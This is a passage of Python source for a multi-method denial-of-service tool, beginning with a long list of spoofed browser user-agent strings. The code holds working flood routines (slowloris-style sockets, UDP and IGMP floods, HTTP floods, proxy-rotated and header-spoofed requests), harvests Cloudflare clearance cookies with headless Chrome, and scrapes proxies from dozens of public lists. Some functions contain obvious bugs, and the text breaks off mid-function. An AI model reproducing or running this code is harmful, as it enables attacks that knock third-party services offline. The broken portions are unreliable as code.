windows|Mozilla/5.0 (Windows NT 6.3; WOW64; en-US) AppleWebKit/535.14 (KHTML, like Gecko) Chrome/47.0.1279.362 Safari/536.2 Edge/13.32302
windows|Mozilla/5.0 (Windows NT 10.0; Win64; x64; en-US) AppleWebKit/535.12 (KHTML, like Gecko) Chrome/51.0.3867.382 Safari/533
windows|Mozilla/5.0 (Windows; Windows NT 10.4; x64; en-US) Gecko/20130401 Firefox/55.3
windows|Mozilla/5.0 (Windows; Windows NT 10.3; Win64; x64; en-US) Gecko/20100101 Firefox/74.7
windows|Mozilla/5.0 (Windows NT 10.3; WOW64; en-US) AppleWebKit/537.47 (KHTML, like Gecko) Chrome/49.0.3829.397 Safari/603
windows|Mozilla/5.0 (Windows NT 6.2;) Gecko/20130401 Firefox/50.4
windows|Mozilla/5.0 (Windows; U; Windows NT 10.4; WOW64; en-US) AppleWebKit/600.7 (KHTML, like Gecko) Chrome/51.0.2762.262 Safari/603
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; U; Windows NT 10.5;; en-US Trident/5.0)
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; Windows NT 10.4; x64; en-US Trident/5.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 10.2;) Gecko/20100101 Firefox/51.0
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 10.3; x64; en-US Trident/4.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 10.2;; en-US) Gecko/20100101 Firefox/49.3
windows|Mozilla/5.0 (Windows NT 10.1; Win64; x64; en-US) Gecko/20100101 Firefox/49.9
windows|Mozilla/5.0 (Windows; Windows NT 10.4; x64; en-US) AppleWebKit/602.40 (KHTML, like Gecko) Chrome/54.0.2750.243 Safari/601
windows|Mozilla/5.0 (Windows NT 10.2; WOW64; en-US) AppleWebKit/600.31 (KHTML, like Gecko) Chrome/50.0.1833.136 Safari/533.7 Edge/8.77674
windows|Mozilla/5.0 (Windows; U; Windows NT 10.2; Win64; x64; en-US) Gecko/20100101 Firefox/58.4
windows|Mozilla/5.0 (Windows; Windows NT 6.1; Win64; x64) Gecko/20100101 Firefox/69.2
windows|Mozilla/5.0 (Windows; U; Windows NT 10.0; Win64; x64; en-US) AppleWebKit/601.20 (KHTML, like Gecko) Chrome/54.0.2861.156 Safari/600.2 Edge/13.22386
windows|Mozilla/5.0 (Windows; U; Windows NT 6.3; x64) AppleWebKit/601.3 (KHTML, like Gecko) Chrome/51.0.2614.336 Safari/600.0 Edge/18.19932
windows|Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/601.25 (KHTML, like Gecko) Chrome/50.0.3863.270 Safari/536
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows; Windows NT 10.1; WOW64; en-US Trident/6.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 6.0; x64; en-US) Gecko/20100101 Firefox/49.7
windows|Mozilla/5.0 (Windows NT 10.4; x64) AppleWebKit/602.28 (KHTML, like Gecko) Chrome/51.0.2820.334 Safari/533
windows|Mozilla/5.0 (Windows; Windows NT 6.0; Win64; x64) Gecko/20100101 Firefox/73.1
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Win64; x64; en-US Trident/6.0)
windows|Mozilla/5.0 (Windows NT 10.2;; en-US) Gecko/20100101 Firefox/64.6
windows|Mozilla/5.0 (Windows; U; Windows NT 10.4; Win64; x64; en-US) Gecko/20100101 Firefox/46.6
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 10.5; x64; en-US Trident/4.0)
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64 Trident/4.0)
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows; Windows NT 10.1; Win64; x64; en-US Trident/4.0)
windows|Mozilla/5.0 (Windows; Windows NT 10.1; x64) AppleWebKit/600.25 (KHTML, like Gecko) Chrome/48.0.1394.189 Safari/536.3 Edge/16.87882
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 6.3; x64 Trident/4.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 10.1; WOW64; en-US) Gecko/20100101 Firefox/46.9
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 6.1; x64 Trident/4.0)
windows|Mozilla/5.0 (Windows NT 10.3; Win64; x64) AppleWebKit/533.6 (KHTML, like Gecko) Chrome/49.0.3879.246 Safari/536
windows|Mozilla/5.0 (Windows; Windows NT 10.5; Win64; x64; en-US) Gecko/20100101 Firefox/60.9
windows|Mozilla/5.0 (Windows NT 6.2;; en-US) Gecko/20100101 Firefox/61.1
windows|Mozilla/5.0 (Windows; U; Windows NT 10.3; WOW64; en-US) AppleWebKit/534.42 (KHTML, like Gecko) Chrome/54.0.2026.210 Safari/537
windows|Mozilla/5.0 (Windows; U; Windows NT 10.1; Win64; x64; en-US) Gecko/20100101 Firefox/56.9
windows|Mozilla/5.0 (Windows NT 10.5;) AppleWebKit/600.50 (KHTML, like Gecko) Chrome/47.0.3368.141 Safari/533.4 Edge/10.61073
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows; U; Windows NT 10.0; x64 Trident/4.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 6.0; x64; en-US) AppleWebKit/535.45 (KHTML, like Gecko) Chrome/53.0.3739.163 Safari/603
windows|Mozilla/5.0 (Windows; U; Windows NT 10.4; x64; en-US) AppleWebKit/537.47 (KHTML, like Gecko) Chrome/48.0.2327.252 Safari/603
windows|Mozilla/5.0 (Windows; U; Windows NT 10.4; Win64; x64) AppleWebKit/536.37 (KHTML, like Gecko) Chrome/53.0.2553.117 Safari/601
windows|Mozilla/5.0 (Windows NT 6.2; Win64; x64; en-US) Gecko/20130401 Firefox/63.2
windows|Mozilla/5.0 (Windows; Windows NT 10.0; Win64; x64; en-US) AppleWebKit/600.38 (KHTML, like Gecko) Chrome/52.0.2913.256 Safari/535
windows|Mozilla/5.0 (Windows; U; Windows NT 10.1;) AppleWebKit/601.19 (KHTML, like Gecko) Chrome/47.0.2248.348 Safari/600
windows|Mozilla/5.0 (Windows; U; Windows NT 10.2; x64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/53.0.3271.359 Safari/533
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows; U; Windows NT 6.0; x64; en-US Trident/4.0)
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 10.4; Win64; x64) AppleWebKit/537.18 (KHTML, like Gecko) Chrome/51.0.1396.370 Safari/602.4 Edge/18.57962
windows|Mozilla/5.0 (Windows; U; Windows NT 10.3;; en-US) AppleWebKit/601.17 (KHTML, like Gecko) Chrome/55.0.1153.295 Safari/600
windows|Mozilla/5.0 (Windows; Windows NT 10.1; x64) Gecko/20100101 Firefox/52.5
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows; U; Windows NT 10.2; Trident/7.0)
windows|Mozilla/5.0 (Windows NT 6.2; Win64; x64) Gecko/20130401 Firefox/56.7
windows|Mozilla/5.0 (Windows NT 6.2; x64; en-US) Gecko/20100101 Firefox/59.7
windows|Mozilla/5.0 (Windows; Windows NT 10.1;) AppleWebKit/600.3 (KHTML, like Gecko) Chrome/49.0.3861.386 Safari/603
windows|Mozilla/5.0 (Windows; Windows NT 10.2; x64; en-US) AppleWebKit/600.34 (KHTML, like Gecko) Chrome/54.0.2561.361 Safari/537
windows|Mozilla/5.0 (Windows; U; Windows NT 10.0; WOW64) AppleWebKit/537.6 (KHTML, like Gecko) Chrome/53.0.1434.167 Safari/537.1 Edge/14.21989
windows|Mozilla/5.0 (Windows; U; Windows NT 10.4; WOW64; en-US) Gecko/20100101 Firefox/48.5
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2; x64; en-US) AppleWebKit/533.40 (KHTML, like Gecko) Chrome/49.0.2663.132 Safari/534
windows|Mozilla/5.0 (Windows NT 10.5; WOW64) Gecko/20100101 Firefox/52.6
windows|Mozilla/5.0 (compatible; MSIE 9.0; Windows; U; Windows NT 10.3; WOW64 Trident/5.0)
windows|Mozilla/5.0 (Windows; U; Windows NT 6.2; x64; en-US) AppleWebKit/534.19 (KHTML, like Gecko) Chrome/50.0.2980.248 Safari/534.1 Edge/14.13412
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 6.1; Win64; x64 Trident/4.0)
windows|Mozilla/5.0 (compatible; MSIE 8.0; Windows; U; Windows NT 6.3; WOW64; en-US Trident/4.0)
windows|Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64; en-US Trident/4.0)
windows|Mozilla/5.0 (Windows NT 10.1; x64) AppleWebKit/602.33 (KHTML, like Gecko) Chrome/55.0.1391.145 Safari/603.6 Edge/9.91643
windows|Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.3; Win64; x64; en-US Trident/6.0)
windows|Mozilla/5.0 (Windows; Windows NT 10.3; Win64; x64) Gecko/20100101 Firefox/70.3
windows|Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.0; x64; en-US Trident/7.0)
windows|Mozilla/5.0 (Windows; Windows NT 6.1; WOW64) Gecko/20130401 Firefox/72.9
windows|Mozilla/5.0 (Windows NT 10.1; x64) Gecko/20100101 Firefox/68.0
windows|Mozilla/5.0 (Windows; U; Windows NT 10.3; Win64; x64; en-US) AppleWebKit/534.22 (KHTML, like Gecko) Chrome/53.0.3375.330 Safari/602.4 Edge/17.95031
windows|Mozilla/5.0 (Windows; Windows NT 10.4;) Gecko/20100101 Firefox/71.1",]
# region get
def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target


def get_proxylist(type):
    if type == "SOCKS5":
        r = requests.get(
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=socks5").text
        open("proxy.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r
    elif type == "HTTP":
        r = requests.get(
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
        open("proxy.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r


def get_proxies():
    global proxies
    if not os.path.exists("./proxy.txt"):
        stdout.write(Fore.MAGENTA + " [*]" + Fore.WHITE + " You Need Proxy File ( ./proxy.txt )\n")
        return False
    proxies = open("./proxy.txt", 'r', encoding='utf8', errors='ignore').read().split('\n')
    return True

ip = r.post("http://fsystem88.ru/ip").text #thank u fsystem))

def get_cookie(target):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
        '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging',
        '--disable-login-animations',
        '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
        '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en'
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(target)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
                pass
        time.sleep(1)
    driver.quit()
    return False

regular_headers = [
            "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
                "Accept-language: en-US,en,q=0.5"
                ]

def init_socket(target):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((str(urlparse(target).netloc), int(443)))
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
    for header in regular_headers:
        s.send('{}\r\n'.format(header).encode('UTF-8'))
    return s

def pyloris():
    socket_count= int(150)
    socket_list=[]
    for _ in range(int(socket_count)):
        try:
            s=init_socket(target, 443)
        except socket.error:
            break
        socket_list.append(s)
    print("Sockets inited")
    while True:
        print("\033[0;37;40m Sending Keep-Alive Headers to {}".format(len(socket_list)))
        for s in socket_list:
            try:
                s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
            except socket.error:
                socket_list.remove(s)
        for _ in range(socket_count - len(socket_list)):
            print("\033[1;34;40m {}Re-creating Socket...".format("\n"))
            try:
                s=init_socket(ip,port)
                if s:
                    socket_list.append(s)
            except socket.error:
                break
        time.sleep(timer)

proxy_resources = [
    'https://www.proxyscan.io/download?type=socks4',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt',
    'https://api.openproxylist.xyz/socks4.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt',
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true',
    'https://www.proxyscan.io/download?type=socks5',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
    'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt',
    'https://api.openproxylist.xyz/socks5.txt',
    'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
    'https://www.proxyscan.io/download?type=http',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
    'https://api.openproxylist.xyz/http.txt',
    'https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt',
    'http://alexa.lr2b.com/proxylist.txt',
    'http://rootjazz.com/proxies/proxies.txt',
    'http://proxysearcher.sourceforge.net/Proxy%20List.php?type=http',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt',
    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
    'https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt',
    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
    'https://proxy-spider.com/api/proxies.example.txt',
    'https://multiproxy.org/txt_all/proxy.txt',
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt',
    'https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt',
    'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all',
    'https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc',
    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies.txt',
    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies2.txt',
    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies3.txt',
    'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/working_proxies4.txt'
]


def steal_proxies(site):
    try:
        data = requests.get(site)
        text_for_parse = data.text
        res = text_for_parse.split()
        with open('proxy.txt', 'a', encoding='utf8', errors='ignore') as proxy_file:
            proxy_file.writelines('\n'.join(res))
        return True
    except Exception as Error:
        return Error


def count_proxies():
    try:
        proxies = sum(1 for line in open('proxy.txt', 'r'))
        return proxies
    except Exception as Error:
        return Error


def spoof(target):
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    spoofip = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return (
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-target: {target['target']}, 1.1.1.1\r\n"
        f"Via: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f'X-Forwarded-For: {spoofip}\r\n'
        f'Real-IP: {spoofip}\r\n'
    )


##############################################################################################
def get_info_l7():
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "URL      " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "THREAD   " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "TIME(s)  " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    t = input()
    return target, thread, t


def get_info_l4():
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "IP       " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "PORT     " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    port = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "THREAD   " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • " + Fore.WHITE + "TIME(s)  " + Fore.LIGHTCYAN_EX + ": " + Fore.LIGHTGREEN_EX)
    t = input()
    return target, port, thread, t


##############################################################################################

# region layer4
def runflooder(target, port, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(4096)
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=flooder, args=(target, port, rand, until))
            thd.start()
        except:
            pass


def flooder(htarget, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(rand, (target, int(port)))
        except:
            sock.close()
            pass


def runsender(target, port, thread, t, payload):
    if payload == "":
        payload = random._urandom(60000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    # payload = Payloads[method]
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=sender, args=(target, port, until, payload))
            thd.start()
        except:
            pass


def sender(target, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(payload, (target, int(port)))
        except:
            sock.close()
            pass
#mine dos
def runmine(target, port, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = "\x06\x00/\x00\x00\x00\x02\x0c\x00"
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=mine, args=(target, port, rand, until))
            thd.start()
        except:
            pass

def mine(target, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto("\x06\x00/\x00\x00\x00\x02\x0c\x00", (target, int(port)))
        except:
            sock.close()
            pass
#vse dos
def runvse(target, port, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = "\x06\x00/\x00\x00\x00\x02\x0c\x00"
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=vse, args=(target, port, rand, until))
            thd.start()
        except:
            pass

def vse(target, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto("\x06\x00/\x00\x00\x00\x02\x0c\x00", (target, int(port)))
        except:
            sock.close()
            pass

def tcpcustom(target, port, threads, time):
    os.system(f"tc.exe {target} {port} {threads} {time}")


# endregion

# region PROXY
##############################################
def check(ip, prox, qtime):
	try:
		ipx = r.get("http://fsystem88.ru/ip", proxies={'http':'http://{}'.format(prox), 'https':'http://{}'.format(prox)}, timeout=qtime).text
	except:
		ipx = ip
	if ip != ipx:
		print(Fore.GREEN+"{} good!".format(prox))
		f = open("proxy.txt", "a+")
		f.write("{}\n".format(prox))
		f.close()
	else:
		print(Fore.RED+"{} bad".format(prox))
##############################################
# endregion

# region HEAD


def LaunchHEAD(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackHEAD, args=(target, until))
            thd.start()
        except:
            pass


def AttackHEAD(target, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.head(target)
            requests.head(target)
        except:
            pass


# endregion

# region POST
def LaunchPOST(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackPOST, args=(target, until))
            thd.start()
        except:
            pass


def AttackPOST(target, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.post(target)
            requests.post(target)
        except:
            pass


# endregion

# region RAW
def LaunchRAW(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackRAW, args=(target, until))
            thd.start()
        except:
            pass


def AttackRAW(target, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(target)
            requests.get(target)
        except:
            pass


# endregion

# region PXRAW
def LaunchPXRAW(target, thread, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackPXRAW, args=(target, until))
            thd.start()
        except:
            pass


def AttackPXRAW(target, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        proxy = 'http://' + str(random.choice(list(proxies)))
        proxy = {
            'http': proxy,
            'https': proxy,
        }
        try:
            requests.get(target, proxies=proxy)
            requests.get(target, proxies=proxy)
        except:
            pass


# endregion

# region PXSOC
def LaunchPXSOC(target, thread, t):
    target = get_target(target)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['target'] + " HTTP/1.1\r\n"
    req += "target: " + target['target'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackPXSOC, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackPXSOC(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = random.choice(list(proxies)).split(":")
            if target[4] == 's':
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.connect(str(target), int(443))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.connect(str(target), int(80))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            return

# endregion

# region SOC
def LaunchSOC(target, thread, t):
    target = get_target(target)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target('target') + " HTTP/1.1\r\nHost: " + target('target') + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackSOC, args=(target, until, req))
            thd.start()
        except:
            pass


def AttackSOC(target, until_datetime, req):
    if target[4] == 's':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect(str(target), int(443))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['target'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect(str(target), int(80))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass


# endregion

def LaunchPPS(target, thread, t):
    target = get_target(target)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackPPS, args=(target, until))
            thd.start()
        except:
            pass


def AttackPPS(target, until_datetime):  #
    if target[4] == 's':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
            except:
                s.close()
        except:
            pass

def LaunchNULL(target, thread, t):
    target = get_target(target)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['target'] + " HTTP/1.1\r\nHost: " + target['target'] + "\r\n"
    req += "User-Agent: null\r\n"
    req += "Referrer: null\r\n"
    req += spoof(target) + "\r\n"
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackNULL, args=(target, until, req))
            thd.start()
        except:
            pass


def AttackNULL(target, until_datetime, req):  #
    if target[4] == 's':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['target']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['target'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['target']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass


def LaunchSPOOF(target, thread, t):
    target = get_target(target)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['target'] + " HTTP/1.1\r\nHost: " + target['target'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(thread)):
        try:
            thd = threading.Thread(target=AttackSPOOF, args=(target, until, req))
            thd.start()
        except:
            pass


def AttackSPOOF(target, until_datetime, req):  #
    if target[4] == 's':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['target']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['target'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['target']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass


def LaunchPXSPOOF(target, thread, t, proxy):
    target = get_target(target)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['target'] + " HTTP/1.1\r\nHost: " + target['target'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(thread)):
        try:
            randomproxy = random.choice(proxy)
            thd = threading.Thread(target=AttackPXSPOOF, args=(target, until, req, randomproxy))
            thd.start()
        except:
            pass


def AttackPXSPOOF(target, until_datetime, req, proxy):  #
    proxy = proxy.split(":")
    print(proxy)
    try:
        if target[4] == 's':
            s = socks.socksocket()
            # s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(target['target']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['target'])
        else:
            s = socks.socksocket()
            # s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
